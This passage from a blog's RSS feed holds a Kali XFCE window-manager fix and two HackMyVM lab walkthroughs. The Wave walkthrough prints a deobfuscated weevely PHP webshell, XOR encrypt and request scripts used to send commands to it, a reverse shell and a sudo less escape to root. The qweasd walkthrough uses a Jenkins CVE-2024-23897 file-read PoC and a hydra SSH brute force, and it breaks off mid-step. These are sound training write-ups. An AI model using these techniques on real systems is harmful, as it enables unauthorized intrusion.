![Image](https://github.com/user-attachments/assets/1d094ada-fae5-4d7d-987a-79cae98e0126)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nyx_APex.html</guid><pubDate>Fri, 27 Jun 2025 09:33:45 +0000</pubDate></item><item><title>Kali Linux 拯救计划：修复窗口无法移动及控制按钮消失问题</title><link>https://7r1UMPHK.github.io/post/Kali%20Linux%20-zheng-jiu-ji-hua-%EF%BC%9A-xiu-fu-chuang-kou-wu-fa-yi-dong-ji-kong-zhi-an-niu-xiao-shi-wen-ti.html</link><description>## 问题场景

在使用 Kali Linux (通常是 XFCE 桌面环境) 时，可能会遇到一个令人困惑的问题：在登录系统后，应用程序窗口（如终端）突然失去了其标题栏，这意味着右上角的最小化、最大化、关闭按钮消失了，并且无法通过鼠标拖动来移动窗口。同时，任务栏上的应用程序图标也可能随之消失。

正如用户所述，这种情况可能在注销并重新登录后发生，打断了正常的工作流程。

## 问题分析

这个问题通常指向 **窗口管理器 (Window Manager)** 出现了故障。在标准的 Kali XFCE 环境中，默认的窗口管理器是 **Xfwm4**。它负责绘制窗口边框、标题栏、控制按钮，并处理窗口的移动、大小调整等操作。当 Xfwm4 未能正常启动、崩溃或被意外进程替换时，就会出现上述症状。

## 解决方案

幸运的是，这个问题有直接的解决方法，包括临时修复和永久性设置。

### 1. 临时解决方法 (立即恢复)

如果你遇到了这个问题，可以立即尝试手动重启窗口管理器。

* **打开一个终端**：

  *   尝试使用快捷键，如 `Ctrl+Alt+T`。
  *   如果无法打开新终端，看是否能通过应用程序菜单（左上角 Kali 图标）找到并启动一个。
  *   如果实在不行，可能需要切换到 TTY (如 `Ctrl+Alt+F3`)，登录后执行命令，再切换回图形界面 (`Ctrl+Alt+F1` 或 `Ctrl+Alt+F7`)。

* **在终端中执行以下命令：**

  ```bash
  xfwm4 --replace &amp;
  ```

* **命令解释：**

  *   `xfwm4`: 调用 XFCE 窗口管理器。
  *   `--replace`: 指示 `xfwm4` 替换当前正在运行的任何窗口管理器实例（即使没有在运行）。
  *   `&amp;`: 将命令放到后台执行，这样关闭终端窗口时不会终止 `xfwm4` 进程。

执行此命令后，你应该能立刻看到窗口的标题栏和控制按钮恢复正常，并且可以再次移动窗口。

### 2. 设置开机自启 (永久性解决方案)

为了避免每次登录后都可能需要手动执行上述命令，可以将 `xfwm4` 设置为在登录时自动启动，确保它总是能正确运行。

*   **打开 '会话和启动' 设置：**
    1.  点击屏幕左上角的 **应用程序菜单** (Kali 图标)。
    2.  在搜索框中输入 '会话和启动' (Session and Startup)。
    3.  点击打开该应用程序。

*   **添加自动启动项：**
    1.  在 '会话和启动' 窗口中，切换到 **'应用程序自动启动' (Application Autostart)** 选项卡。
    2.  点击 **'+ 添加' (+ Add)** 按钮。
    3.  在弹出的对话框中填写以下信息：
        *   **名称 (Name):** `XFWM4 Autostart` (或任何你容易识别的名称)
        *   **描述 (Description):** `确保 XFCE 窗口管理器在登录时启动` (可选)
        *   **命令 (Command):** `xfwm4`
            *   *注意：这里通常不需要 `--replace` 参数，系统启动过程应能确保 `xfwm4` 正常加载。如果只写 `xfwm4` 仍然有问题，可以尝试改为 `xfwm4 --replace`。*
        *   **触发器 (Trigger):** 保持默认的 `on login` 即可。

    4.  点击 **'确定' (OK)** 或 **'添加' (Add)** 按钮保存。

*   **完成：**
    关闭 '会话和启动' 窗口。现在，每次你登录 Kali Linux 时，系统都会自动尝试启动 `xfwm4`，从而大概率避免窗口管理器丢失的问题。

## 结论

Kali Linux (XFCE) 窗口失去控制按钮和移动能力的问题，通常是由于窗口管理器 `xfwm4` 未能正常工作所致。通过 `xfwm4 --replace &amp;` 命令可以立即修复，而将其添加到 '会话和启动' 中则可以提供一个更持久的解决方案，确保用户体验的连续性。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Kali%20Linux%20-zheng-jiu-ji-hua-%EF%BC%9A-xiu-fu-chuang-kou-wu-fa-yi-dong-ji-kong-zhi-an-niu-xiao-shi-wen-ti.html</guid><pubDate>Fri, 27 Jun 2025 09:33:43 +0000</pubDate></item><item><title>hmv_Wave</title><link>https://7r1UMPHK.github.io/post/hmv_Wave.html</link><description># hmv_Wave

# 0.简介

**靶机**：[hackmyvm - Wave](https://hackmyvm.eu/machines/machine.php?vm=Wave)
**难度**：黄色
**目标 IP**：192.168.205.138
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 18:30 CST
Nmap scan report for 192.168.205.138
Host is up (0.00029s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5555/tcp open  freeciv
MAC Address: 08:00:27:37:83:76 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.58 seconds
```

去80看看web页面

# 2.踩点

![Image](https://github.com/user-attachments/assets/fc213d31-5792-4ec3-bc4f-f8ddc75839bb)

爆破目录

```bash
┌──(kali㉿kali)-[~/test]
└─$ feroxbuster -u 'http://192.168.205.138/' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md 
                                                                                                                                  
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben 'epi' Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.205.138/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, md]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                 
200      GET        3l        5w       32c http://192.168.205.138/backup/phptest.bck
200      GET        3l        6w       31c http://192.168.205.138/backup/index.bck
200      GET        2l        1w        4c http://192.168.205.138/backup/log.log
200      GET        1l        2w       18c http://192.168.205.138/backup/robots.bck
200      GET        2l       13w      833c http://192.168.205.138/backup/weevely.bck
200      GET        3l        6w       31c http://192.168.205.138/
301      GET        7l       11w      169c http://192.168.205.138/backup =&gt; http://192.168.205.138/backup/
200      GET        3l        6w       31c http://192.168.205.138/index.html
200      GET        1l        2w       18c http://192.168.205.138/robots.txt
200      GET        1l        2w       11c http://192.168.205.138/phptest.php
[####################] - 48s   311445/311445  0s      found:10      errors:0    
[####################] - 47s   311410/311410  6566/s  http://192.168.205.138/ 
[####################] - 0s    311410/311410  77852500/s http://192.168.205.138/backup/ =&gt; Directory listing (add --scan-dir-listings to scan)                           
```

探索一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138/backup/phptest.bck
&lt;?php
print ('HELLO WORLD');
?&gt;
                                                                                                                                
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138/backup/index.bck  
&lt;h1&gt; WAVE &lt;/h1&gt;

&lt;!-- wAvE --&gt;
                                                                                                                                
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138/backup/log.log  
OK

                                                                                                                                
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138/backup/robots.bck
Disallow: /backup
                                                                                                                                
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138/backup/weevely.bck
Warning: Binary output can mess up your terminal. Use '--output -' to tell curl to output it to your terminal anyway, or consider 
Warning: '--output &lt;FILE&gt;' to save to a file.
```

找到了一个文件，我们下载下来看看

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138/backup/weevely.bck -o /tmp/weevely.bck
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   515  100   515    0     0   217k      0 --:--:-- --:--:-- --:--:--  251k
                                                                                                                                
┌──(kali㉿kali)-[~/test]
└─$ cd tmp                                                      
                                                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/test/tmp]
└─$ cat weevely.bck                
&lt;?php include '\160\x68\141\x72\72\57\57'.basename(__FILE__).'\57\x78';__HALT_COMPILER(); ?&gt;/x�X���U��j�0ſ�)J�hB�S;���
                                                                                                                      �/�J��▒m�.��)��n�(▒��'`�=6�&amp;T�YE�p��(�q1���a'H�Pq6�.���v���/��8�ĳe��$+��s�'����5�|��H�� O����w�2%��OyTV���Q�b�A���h��=�W {��
�kЛw8�a����S�����
�fBLXx  ���Ϝ����v����m���%#,H��R#2HJ]�t�|*��������h�Ms��
                       ږ&amp;'��Y���P��B��lXw�l�e���E!S�He�2�p�7G�[N��=�-��Ƀ�i�)�[��N����7��U_�=*��Ψ�s?c((VGBMB                                                                                                                                

```

部分内容显示乱码，但是我们通过可读的可以得知，可能是一个恶意后门，我们尝试恢复一下

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ file weevely.bck
weevely.bck: PHP phar archive with SHA1 signature
                                                                                                                                
┌──(kali㉿kali)-[~/test/tmp]
└─$ phar extract -f weevely.bck weevely.phpr
//home/kali/test/tmp/weevely.bck/x ...ok
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/test/tmp]
└─$ cat /home/kali/test/tmp/weevely.phpr/home/kali/test/tmp/weevely.bck/x 
&lt;?php eval('$k='3ddf0d5c';$kh='b6e7a529b6c2';$kf='d598a771749b';$p='afnqDsRcBpVmU71y';

function x($t,$k){
$c=strlen($k);$l=strlen($t);$o='';
for($i=0;$i&lt;$l;){
for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)
{
$o.=$t[$i]^$k[$j];
}
}
return $o;
}
if (@preg_match('/$kh(.+)$kf/',@file_get_contents('php://input'),$m)==1) {
@ob_start();
@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
$o=@ob_get_contents();
@ob_end_clean();
$r=@base64_encode(@x(@gzcompress($o),$k));
print('$p$kh$r$kf');
}');                                                                                                                                
```

确实是**Webshell 后门**，我们尝试利用一下

```bash
┌──(kali㉿kali)-[~/…/kali/test/tmp/weevely.bck]
└─$ cat tool.php 
&lt;?php
$k = '3ddf0d5c';  // 密钥

function x($t, $k)
{
    $c = strlen($k);  // 密钥长度
    $l = strlen($t);  // 文本长度
    $o = '';

    // XOR 加密/解密
    for ($i = 0; $i &lt; $l;)
    {
        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++)
        {
            $o .= chr(ord($t[$i]) ^ ord($k[$j]));
        }
    }
    return $o;
}

echo '选择操作：\n';
echo '1. 加密\n';
echo '2. 解密\n';
$choice = trim(fgets(STDIN));  // 获取用户输入

echo '请输入文本：\n';
$input_text = trim(fgets(STDIN));  // 获取要加密/解密的文本

if ($choice == 1) {
    // 加密
    echo '加密前的文本: ' . $input_text . '\n';

    // 压缩文本
    $compressed_text = gzcompress($input_text);  // 压缩文本
    $encrypted_text = x($compressed_text, $k);   // XOR 加密
    echo '加密后的文本: ' . base64_encode($encrypted_text) . '\n';  // 输出 Base64 编码后的加密文本
} elseif ($choice == 2) {
    // 解密
    $decoded_text = base64_decode($input_text);  // Base64 解码
    $decrypted_text = x($decoded_text, $k);      // XOR 解密
  
    // 解压缩
    $decompressed = @gzuncompress($decrypted_text);  // 解压缩，使用 @ 避免警告
  
    // 如果解压成功，则输出解压后的内容；否则输出解密后的内容
    if ($decompressed !== false) {
        echo '解密并解压后的文本: ' . $decompressed . '\n';
    } else {
        echo '解密后的文本: ' . $decrypted_text . '\n';
    }
} else {
    echo '无效的选项\n';
}
?&gt;
```

加密和解密模块（解密模块是乱码，建议不用，或者自己改）。发送模块我们还差一个网址，我们之前用那个是备份文件，我们知道它的命名规则，那我们尝试爆破

```bash
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -c -u 'http://192.168.205.138/weevelyFUZZ' -w /usr/share/seclists/Discovery/Web-Content/web-extensions-big.txt --hc 404   
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.138/weevelyFUZZ
Total requests: 66885

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000037:   200        0 L      0 W        0 Ch        '.php7'                                                             
000000248:   404        7 L      11 W       153 Ch      '.lOg'                                                              

Total time: 2.123899
Processed Requests: 246
Filtered Requests: 245
Requests/sec.: 115.8246


```

根据已知信息编写脚本

```bash
┌──(kali㉿kali)-[~/…/kali/test/tmp/weevely.bck]
└─$ cat request.py 
import requests
import base64

# 密钥 (与 PHP 脚本中的密钥一致)
kh = 'b6e7a529b6c2'
kf = 'd598a771749b'
p = 'afnqDsRcBpVmU71y'

def main():
    # 输入要发送的字符串
    input_data = input('Enter the string to send: ')

    # 构造带有编码数据的请求体
    request_data = f'{kh}{input_data}{kf}'

    url = 'http://192.168.205.138/weevely.php7'  # 请根据实际情况修改

    # 发送 POST 请求
    response = requests.post(url, data=request_data)

    # 打印响应报文
    print('Response:', response.text)

if __name__ == '__main__':
    main()

```

发送模块。我们尝试一下

```bash
┌──(kali㉿kali)-[~/…/kali/test/tmp/weevely.bck]
└─$ php tool.php
选择操作：
1. 加密
2. 解密
1
请输入文本：
system('ping -c2 192.168.205.141');
加密前的文本: system('ping -c2 192.168.205.141');
加密后的文本: S/hPyBxKfK7mNE6u/C9is35SNlaEUOdQB9e0VQJU4FAHVTC0hGI1ozptfA==

┌──(kali㉿kali)-[~/…/kali/test/tmp/weevely.bck]
└─$ python3 request.py
Enter the string to send: S/hPyBxKfK7mNE6u/C9is35SNlaEUOdQB9e0VQJU4FAHVTC0hGI1ozptfA==
Response: afnqDsRcBpVmU71yb6e7a529b6c2S/jp6f3u9yMj4Isfut49aVWaVqAvrEySgZxiVBbHOVl6KFMHTZ944ZQclbQEIWC05MOHiT+Q62uui+A3K8WYpUFCyNb58w7Y8YGh+OA4ZFpFRq2La91DLq87XUak1QjwTHJ+qr8GRRC72jSkqEkXHi5T197tvwT9lw2e5+7iz2VRo+VepOD08CvQytpLQkWEWe7lv2cPLReNkMV5R9FNGMMM7LBjd4Gx6rS3VxPib9nNQsedo9XHXjkoCy4V1mmqug38XPsihxwXSDrMd598a771749b
                                      
┌──(kali㉿kali)-[~/test]
└─$ sudo tcpdump -A -n icmp
[sudo] kali 的密码：
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
19:22:08.263760 IP 192.168.205.138 &gt; 192.168.205.141: ICMP echo request, id 58412, seq 1, length 64
E..T..@.@..Z...........c.,.....g....p....................... !'#$%&amp;'()*+,-./01234567
19:22:08.263782 IP 192.168.205.141 &gt; 192.168.205.138: ICMP echo reply, id 58412, seq 1, length 64
E..T....@.\F...........c.,.....g....p....................... !'#$%&amp;'()*+,-./01234567
19:22:09.276459 IP 192.168.205.138 &gt; 192.168.205.141: ICMP echo request, id 58412, seq 2, length 64
E..T.(@.@..............1.,.....g............................ !'#$%&amp;'()*+,-./01234567

```

运行正常，我们弹shell

```bash
┌──(kali㉿kali)-[~/…/kali/test/tmp/weevely.bck]
└─$ python3 request.py
Enter the string to send: S/hPyBxKfK7mNK4tZlSBV+FXUNXgVwdT5ldQV2TUNWE2uTBjzcD5X87AoIQ8QXgIM1fValA=

┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888             
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.138] 58888
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```bash
www-data@wave:~/html$ sudo -l  
[sudo] password for www-data: 
sudo: a password is required
www-data@wave:~/html$ ls -la
total 32
drwxr-xr-x 3 www-data www-data 4096 Sep  5  2023 .
drwxr-xr-x 3 root     root     4096 Sep  4  2023 ..
drwxr-xr-x 2 www-data www-data 4096 Sep  5  2023 backup
-rw-r--r-- 1 www-data www-data   31 Sep  4  2023 index.html
-rw-r--r-- 1 www-data www-data   32 Sep  4  2023 phptest.php
-rw-r--r-- 1 www-data www-data   18 Sep  4  2023 robots.txt
-rw-r--r-- 1 root     root      515 Sep  5  2023 weevely.bck
-rw-r--r-- 1 www-data www-data  515 Sep  5  2023 weevely.php7
www-data@wave:~/html$ cd /home/
www-data@wave:/home$ ls -al
total 16
drwxr-xr-x  4 root  root  4096 Sep  4  2023 .
drwxr-xr-x 18 root  root  4096 Sep  4  2023 ..
drwx------  4 angie angie 4096 Jan 18 10:40 angie
drwx------  2 carla carla 4096 Sep  4  2023 carla
www-data@wave:/home$ cd /opt/
www-data@wave:/opt$ ls -al
total 12
drwxr-xr-x  2 root root  4096 Sep  4  2023 .
drwxr-xr-x 18 root root  4096 Sep  4  2023 ..
-rwxrwxr--  1 root carla   46 Sep  4  2023 secret.txt
www-data@wave:/opt$ cat secret.txt 
Dietro di lui, 
dietro di lui solo la nebbia.
www-data@wave:/opt$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/su
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/newgrp
www-data@wave:/opt$ /sbin/getcap -r / 2&gt;/dev/null
/usr/bin/ping cap_net_raw=ep
www-data@wave:/opt$ ss -tuln | grep tcp
tcp   LISTEN 0      1024       127.0.0.1:3923      0.0.0.0:*            
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*    
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*    
tcp   LISTEN 0      128             [::]:22           [::]:*    
tcp   LISTEN 0      511             [::]:80           [::]:*   
```

有个未知端口，我们转发一下

```bash
www-data@wave:~/html$ cd /tmp/
www-data@wave:/tmp$ wget 192.168.205.141/socat
--2025-01-18 13:20:09--  http://192.168.205.141/socat
Connecting to 192.168.205.141:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: 'socat'

socat                                                        0%[                                                                       socat                                                      100%[========================================================================================================================================&gt;] 366.38K  --.-KB/s    in 0.003s  

2025-01-18 13:20:09 (105 MB/s) - 'socat' saved [375176/375176]

www-data@wave:/tmp$ chmod +x socat 
www-data@wave:/tmp$ ./socat TCP-LISTEN:1234,fork TCP4:127.0.0.1:3923 &amp;
[1] 592
```

![Image](https://github.com/user-attachments/assets/74b5fd1f-838c-462a-acb9-576e7a15086e)

像个文件管理器，而且看样子它还是在家目录下，我们尝试上传一个密钥上去看看能不能一发入魂

```bash
mkdir .ssh
cd .ssh
ssh-keygen -t rsa 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): id_rsa
Enter passphrase (empty for no passphrase): 123456
Enter same passphrase again: 123456

┌──(kali㉿kali)-[~/test/.ssh]
└─$ ls -al
总计 20
drwxrwxr-x  3 kali kali 4096  1月18日 20:34 .
drwxrwxr-x 10 kali kali 4096  1月18日 20:31 ..
-rw-r--r--  1 kali kali  563  1月18日 17:40 authorized_keys
-rw-------  1 kali kali 2635  1月18日 17:40 id_rsa
drwxrwxr-x  2 kali kali 4096  1月18日 20:35 .ssh


┌──(kali㉿kali)-[~/test/.ssh]
└─$ ls -la .ssh/              
总计 12
drwxrwxr-x 2 kali kali 4096  1月18日 20:35 .
drwxrwxr-x 3 kali kali 4096  1月18日 20:34 ..
-rw-r--r-- 1 kali kali  563  1月18日 17:40 authorized_keys
                                                            
```

记得在里面再创建一个`.ssh`文件夹，并且把`id\_rsa.pub`改名为`authorized_keys`，然后打开你的文件管理器把`.ssh`（只有`authorized_keys`那个）文件夹**拖进去上传**

![Image](https://github.com/user-attachments/assets/a896ce7c-321b-4eb0-a253-bef4e2a7d01a)

```bash
┌──(kali㉿kali)-[~/test/.ssh]
└─$ ssh angie@192.168.205.138 -i id_rsa
The authenticity of host '192.168.205.138 (192.168.205.138)' can't be established.
ED25519 key fingerprint is SHA256:6XC0N82ZtO32MzrvGO7WaR/Yg+rpDa0Wkgoy3H8IdnE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.138' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Linux wave 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Sep  5 11:14:50 2023 from 192.168.0.100
angie@wave:~$ id
uid=1000(angie) gid=1000(angie) grupos=1000(angie),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)

```

尝试提权

```bash
angie@wave:~$ sudo -l
Matching Defaults entries for angie on wave:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User angie may run the following commands on wave:
    (ALL) NOPASSWD: /usr/bin/less -F /opt/secret.txt
angie@wave:~$ sudo /usr/bin/less -F /opt/secret.txt
Dietro di lui, 
dietro di lui solo la nebbia.

```

小窗提权？

![Image](https://github.com/user-attachments/assets/f85836de-c61b-43be-9851-7a6fb509c529)

还真是

```bash
root@wave:/home/angie# id
uid=0(root) gid=0(root) grupos=0(root)

```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Wave.html</guid><pubDate>Fri, 27 Jun 2025 09:33:39 +0000</pubDate></item><item><title>hmv_qweasd</title><link>https://7r1UMPHK.github.io/post/hmv_qweasd.html</link><description># hmv_qweasd

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Qweasd
**难度**：黄色
**目标 IP**：192.168.205.217
**本机** IP：192.168.205.141

---

## **1. 端口枚举及服务探测**

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.217
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 11:35 CST
Nmap scan report for 192.168.205.217
Host is up (0.00040s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Jetty 10.0.18
MAC Address: 08:00:27:75:04:B0 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.23 seconds
                                                                 
```

扫描结果显示目标机器开放了 22 (SSH) 、 80 (HTTP)。

## **2. Web 服务探测与任意文件读取**

对 80 端口感兴趣，访问 Web 页面。访问有点慢，发现它在加载`192.168.5.32:8080`的东西，我们先给他禁了

![image](https://github.com/user-attachments/assets/cf4ca609-e74a-46f2-9298-addc5931cf52)

上去在people看到有两个用户，`anonymous`和`an0ma1`

![image](https://github.com/user-attachments/assets/e794228c-5f00-417e-a444-4a99ff39139a)

&lt;div&gt;
&lt;br /&gt;
&lt;/div&gt;

扫描一下站点的架构

```bash
┌──(kali㉿kali)-[~/test]
└─$ searchsploit Jenkins 2.441  
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Jenkins 2.441 - Local File Inclusion                                                                 | java/webapps/51993.py
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

有一个任意文件读取漏洞，你们可以用这个POC但是我感觉[这个](https://github.com/godylockz/CVE-2024-23897)更好用，我就用这个了

```bash
┌──(kali㉿kali)-[~/test]
└─$ git clone https://github.com/godylockz/CVE-2024-23897.git                     
正克隆到 'CVE-2024-23897'...
remote: Enumerating objects: 4, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 4 (delta 0), reused 4 (delta 0), pack-reused 0 (from 0)
接收对象中: 100% (4/4), 完成.
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cd CVE-2024-23897 
                                                                                                                                     
┌──(kali㉿kali)-[~/test/CVE-2024-23897]
└─$ ls    
jenkins_fileread.py  README.md
                                     
┌──(kali㉿kali)-[~/test/CVE-2024-23897]
└─$ python3 jenkins_fileread.py -u http://192.168.205.217:8080
Welcome to the Jenkins file-read shell. Type help or ? to list commands.

file&gt; /etc/passwd
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
penetration:x:1001:1001::/home/penetration:/bin/bash
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
kali:x:1000:1000:asd:/home/kali:/bin/bash
root:x:0:0:root:/root:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
games:x:5:60:games:/usr/games:/usr/sbin/nologin
                      
```

用户是`kali`、`penetration`、`root`

然后有两个**玩法**

### 方法一：

直接拿用户爆破ssh

```bash
┌──(kali㉿kali)-[~]
└─$ cat user                                                                                        
kali
penetration
root

┌──(kali㉿kali)-[~]
└─$ hydra -L user -P /usr/share/wordlists/q5000.txt ssh://192.168.205.217 -f -t 64 
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-31 12:44:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 15000 login tries (l:3/p:5000), ~235 tries per task
[DATA] attacking ssh://192.168.205.217:22/
[22][ssh] host: 192.168.205.217   login: kali   password: asdfgh
[STATUS] attack finished for 192.168.205.217 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-31 12:45:43

```

拿到`kali`的密码直接登录，你就会发现`sudo`可以直接执行任意软件`bash -p`就是root了，这种应该不是正确的打开方式。

### 方法二：

拿任意读取读用户帐户密码然后使用`jenkins`弹反弹shell，但是`jenkins`的路径我没有找到，我纯属马后炮，哈哈哈

```bash
┌──(kali㉿kali)-[~/test/CVE-2024-23897]
└─$ python3 jenkins_fileread.py -u http://192.168.205.217:8080\
Welcome to the Jenkins file-read shell. Type help or ? to list commands.

file&gt; /home/penetration/users/users.xml
File does not exist
file&gt; /home/penetration/.jenkins/users/users.xml
